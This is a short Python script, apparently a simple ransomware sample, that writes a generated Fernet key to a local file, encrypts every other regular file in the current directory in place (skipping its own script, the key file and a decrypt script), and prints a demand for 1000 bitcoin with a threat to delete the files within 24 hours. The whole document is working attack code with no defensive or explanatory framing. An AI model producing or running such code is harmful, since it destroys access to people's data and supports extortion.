import os
from cryptography.fernet import Fernet

files = []
key = Fernet.generate_key()

for file in os.listdir():
    if file == "ransomware.py" or file == "thekey.key" or file == "decrypt.py":
        continue
    if os.path.isfile(file):
        files.append(file)
with open ("thekey.key", "wb") as thekey:
    thekey.write(key)
for file in files:
    with open(file, "rb") as thefile:
        contents = thefile.read()
    contents_encrypted = Fernet(key).encrypt(contents)
    with open(file, "wb") as thefile:
        thefile.write(contents_encrypted)

print(files)
print("[ALL YOUR FILES HAVE BEEN ENCRYPTED SEND ME 1000 BITCOIN OR I'LL DELETE THEM IN 24 HOURS!!!]")